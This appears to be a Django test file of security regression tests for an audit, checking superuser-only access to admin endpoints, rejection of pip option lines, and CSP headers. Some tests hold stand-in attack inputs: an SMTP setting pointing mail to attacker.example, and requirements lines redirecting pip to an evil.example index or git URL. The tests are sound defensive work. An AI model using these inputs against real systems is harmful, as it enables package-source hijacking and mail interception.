"""
Security regression tests for the 2026-07-05 audit
(2026-07 security audit): missing-authorization fixes (Vulns 3/4/5)
and the bulk-requirements pip source-injection fix (Vuln 6).

For the authz fixes, a plain authenticated **member** (non-superuser) must not be
able to reach instance-global admin surfaces. The shared ``@superuser_required``
decorator answers a signed-in non-superuser with the console's 403 page (UI
audit UX6; it used to be a 302 to ``auth:login``), so a denied request is a 403
that performs no mutation.
"""
import uuid
from unittest import mock

from django.test import TestCase
from django.urls import reverse

from core.forms import BulkInstallForm
from core.models import GlobalSettings, User
from core.services import EnvironmentService


def _mock_setup(test):
    """Bypass the setup-wizard middleware so requests reach the target view."""
    for target in (
        "core.services.setup_service.SetupService.is_setup_needed",
        "core.services.setup_service.SetupService.needs_admin_setup",
    ):
        p = mock.patch(target, return_value=False)
        p.start()
        test.addCleanup(p.stop)


class SettingsAuthzTests(TestCase):
    """Vuln 3 — the six global-settings mutation handlers are superuser-only."""

    # Every settings handler that mutates the GlobalSettings singleton or performs
    # an instance-wide action. Members must be denied on all of them.
    GATED_ENDPOINTS = [
        "cpanel:toggle_global_pause",
        "cpanel:notification_settings",
        "cpanel:general_settings",
        "cpanel:retention_settings",
        "cpanel:worker_settings",
        "cpanel:manual_cleanup",
    ]

    def setUp(self):
        _mock_setup(self)
        self.member = User.objects.create(email="member@example.com")  # non-superuser
        self.superuser = User.objects.create(email="root@example.com", is_superuser=True)

    def test_member_denied_on_every_gated_endpoint(self):
        self.client.force_login(self.member)
        for name in self.GATED_ENDPOINTS:
            with self.subTest(endpoint=name):
                resp = self.client.post(reverse(name), {})
                self.assertEqual(resp.status_code, 403, f"{name} did not deny a member")

    def test_member_cannot_hijack_email_backend(self):
        """Concrete escalation from the audit: a member repoints outbound mail to
        their own SMTP host to intercept a superuser password-reset. Must fail."""
        self.client.force_login(self.member)
        resp = self.client.post(
            reverse("cpanel:notification_settings"),
            {
                "email_backend": GlobalSettings.EmailBackend.SMTP,
                "smtp_host": "attacker.example",
                "smtp_port": "587",
                "default_notification_email": "attacker@evil.example",
            },
        )
        self.assertEqual(resp.status_code, 403)
        gs = GlobalSettings.get_settings()
        self.assertEqual(gs.email_backend, GlobalSettings.EmailBackend.DISABLED)
        self.assertNotEqual(gs.smtp_host, "attacker.example")

    def test_settings_json_reads_are_superuser_only(self):
        """The cleanup preview lists every workspace's script names; system info
        describes the host. Both belong to the superuser-only Settings page."""
        from core.models import Environment, Run, Script, Workspace

        other = Workspace.objects.create(name="Other team")
        script = Script.objects.create(
            name="OTHER-TEAM-SCRIPT", workspace=other,
            environment=Environment.objects.create(name="authz-env"),
        )
        Run.objects.create(script=script, workspace=other)
        for name in ("cpanel:cleanup_preview", "cpanel:system_info"):
            with self.subTest(endpoint=name):
                self.client.force_login(self.member)
                resp = self.client.get(reverse(name))
                self.assertEqual(resp.status_code, 403)
                self.assertNotIn("OTHER-TEAM-SCRIPT", resp.content.decode())
                self.client.force_login(self.superuser)
                self.assertEqual(self.client.get(reverse(name)).status_code, 200)

    def test_superuser_still_reaches_settings_handlers(self):
        """The gate must not break admins: a superuser reaches the view and is
        redirected back to the settings page, not to login."""
        self.client.force_login(self.superuser)
        from core.forms import NotificationSettingsForm
        from core.test_polish_settings import current_values

        resp = self.client.post(reverse("cpanel:notification_settings"), current_values(NotificationSettingsForm))
        self.assertEqual(resp.status_code, 302)
        self.assertEqual(resp["Location"], reverse("cpanel:settings") + "#notifications")


class EnvironmentAuthzTests(TestCase):
    """Vuln 5 — environment + package management is superuser-only.

    These endpoints create/delete shared cross-workspace environments and run
    `pip` on the host (unsandboxed), so a member reaching them means both host
    code-exec (via a package build step) and cross-tenant infra mutation.
    """

    def setUp(self):
        _mock_setup(self)
        self.member = User.objects.create(email="member@example.com")  # non-superuser
        self.superuser = User.objects.create(email="root@example.com", is_superuser=True)
        # A well-formed but non-existent pk: the superuser gate fires before the
        # object lookup, so a denied member gets a 403, never a 404.
        self._pk = uuid.uuid4()

    def _gated_urls(self):
        pk = self._pk
        return [
            reverse("cpanel:environment_create"),
            reverse("cpanel:environment_edit", args=[pk]),
            reverse("cpanel:environment_delete", args=[pk]),
            reverse("cpanel:environment_set_default", args=[pk]),
            reverse("cpanel:package_install", args=[pk]),
            reverse("cpanel:package_uninstall", args=[pk]),
            reverse("cpanel:bulk_install", args=[pk]),
        ]

    def test_member_denied_on_every_env_endpoint(self):
        self.client.force_login(self.member)
        for url in self._gated_urls():
            with self.subTest(url=url):
                resp = self.client.post(url, {})
                self.assertEqual(resp.status_code, 403, f"{url} did not deny a member")

    def test_member_cannot_reach_create_form(self):
        """Even the create page (GET) is admin-only."""
        self.client.force_login(self.member)
        resp = self.client.get(reverse("cpanel:environment_create"))
        self.assertEqual(resp.status_code, 403)

    def test_superuser_reaches_create_form(self):
        """The gate doesn't break admins: a superuser reaches the create form."""
        self.client.force_login(self.superuser)
        resp = self.client.get(reverse("cpanel:environment_create"))
        self.assertEqual(resp.status_code, 200)


class AccessDeniedPageTests(TestCase):
    def setUp(self):
        _mock_setup(self)

    def test_role_denial_renders_the_styled_403_page(self):
        from core.models import Workspace, WorkspaceMembership

        member = User.objects.create(email="plain@example.com")
        workspace = Workspace.get_default() or Workspace.objects.create(name="D", is_default=True)
        WorkspaceMembership.ensure(member, workspace, role=WorkspaceMembership.ROLE_MEMBER)
        self.client.force_login(member)
        response = self.client.get(reverse("cpanel:database_list"))
        self.assertEqual(response.status_code, 403)
        self.assertTemplateUsed(response, "403.html")
        # UX6: rendered inside the console shell (sidebar) with the view's reason
        self.assertTemplateUsed(response, "cpanel/error_shell.html")
        self.assertContains(response, 'id="app-sidebar"', status_code=403)
        self.assertContains(response, "Only a workspace owner or admin can manage databases.", status_code=403)


class LogsAuthzTests(TestCase):
    """Vuln 4 — the shared application log is superuser-only to read.

    The log is not workspace-scoped, so a member reading it is cross-tenant
    disclosure. Gating matches the destructive ``logs_clear_view`` sibling.
    """

    def setUp(self):
        _mock_setup(self)
        self.member = User.objects.create(email="member@example.com")  # non-superuser
        self.superuser = User.objects.create(email="root@example.com", is_superuser=True)

    def test_member_denied_on_logs_page(self):
        self.client.force_login(self.member)
        resp = self.client.get(reverse("cpanel:logs"))
        self.assertEqual(resp.status_code, 403)

    def test_member_denied_on_logs_api(self):
        self.client.force_login(self.member)
        resp = self.client.get(reverse("cpanel:logs_api"))
        self.assertEqual(resp.status_code, 403)
        self.assertFalse(resp.json()["success"])

    def test_superuser_can_read_logs(self):
        self.client.force_login(self.superuser)
        self.assertEqual(self.client.get(reverse("cpanel:logs")).status_code, 200)
        api = self.client.get(reverse("cpanel:logs_api"))
        self.assertEqual(api.status_code, 200)
        self.assertTrue(api.json()["success"])


class BulkRequirementsInjectionTests(TestCase):
    """Vuln 6 — bulk requirements must reject pip option lines (leading "-").

    Skipping them (the old behaviour) let a body like ``--index-url
    https://evil/simple`` redirect installs to an attacker index, since pip
    honours option lines inside a requirements file.
    """

    OPTION_LINES = [
        "--index-url https://evil.example/simple\nrequests",
        "--extra-index-url https://evil.example/simple\nrequests",
        "-i https://evil.example/simple\nrequests",
        "-e git+https://evil.example/pkg.git#egg=pkg",
    ]

    def test_form_rejects_option_lines(self):
        for body in self.OPTION_LINES:
            with self.subTest(body=body.splitlines()[0]):
                form = BulkInstallForm(data={"requirements": body})
                self.assertFalse(form.is_valid())
                self.assertIn(
                    "not allowed",
                    " ".join(form.errors.get("__all__", [])).lower(),
                )

    def test_form_accepts_plain_requirements(self):
        form = BulkInstallForm(data={"requirements": "requests==2.31.0\n# a comment\nflask"})
        self.assertTrue(form.is_valid(), form.errors)

    def test_service_rejects_option_lines_before_running_pip(self):
        """Defense in depth: install_requirements refuses an option line without
        ever invoking pip."""
        env = mock.Mock()
        env.get_pip_executable.return_value = "/fake/pip"
        env.name = "test-env"

        with mock.patch(
            "core.services.environment_service.os.path.isfile", return_value=True
        ), mock.patch(
            "core.services.environment_service.subprocess.run"
        ) as run:
            success, out, err = EnvironmentService.install_requirements(
                env, "--index-url https://evil.example/simple\nrequests"
            )

        self.assertFalse(success)
        self.assertIn("not allowed", err.lower())
        run.assert_not_called()


class ContentSecurityPolicyTests(TestCase):
    """Defense-in-depth (audit item 7): HTML responses carry the scoped CSP.

    The policy hardens clickjacking / base-tag / object / form exfiltration but
    intentionally leaves script-src unset so the app's inline scripts and event
    handlers keep working (a strict script-src is a separate nonce refactor).
    """

    def setUp(self):
        _mock_setup(self)
        self.superuser = User.objects.create(email="root@example.com", is_superuser=True)

    def test_html_response_has_scoped_csp_header(self):
        self.client.force_login(self.superuser)
        resp = self.client.get(reverse("cpanel:dashboard"))
        csp = resp.headers.get("Content-Security-Policy", "")
        self.assertIn("frame-ancestors 'none'", csp)
        self.assertIn("object-src 'none'", csp)
        self.assertIn("base-uri 'none'", csp)
        self.assertIn("form-action 'self'", csp)
        # Must NOT constrain scripts/styles — that would break inline handlers.
        self.assertNotIn("script-src", csp)
        self.assertNotIn("style-src", csp)

    def test_json_api_response_has_no_csp(self):
        self.client.force_login(self.superuser)
        resp = self.client.get(reverse("cpanel:logs_api"))
        # CSP only governs document contexts; the header is scoped to text/html.
        self.assertNotIn("Content-Security-Policy", resp.headers)
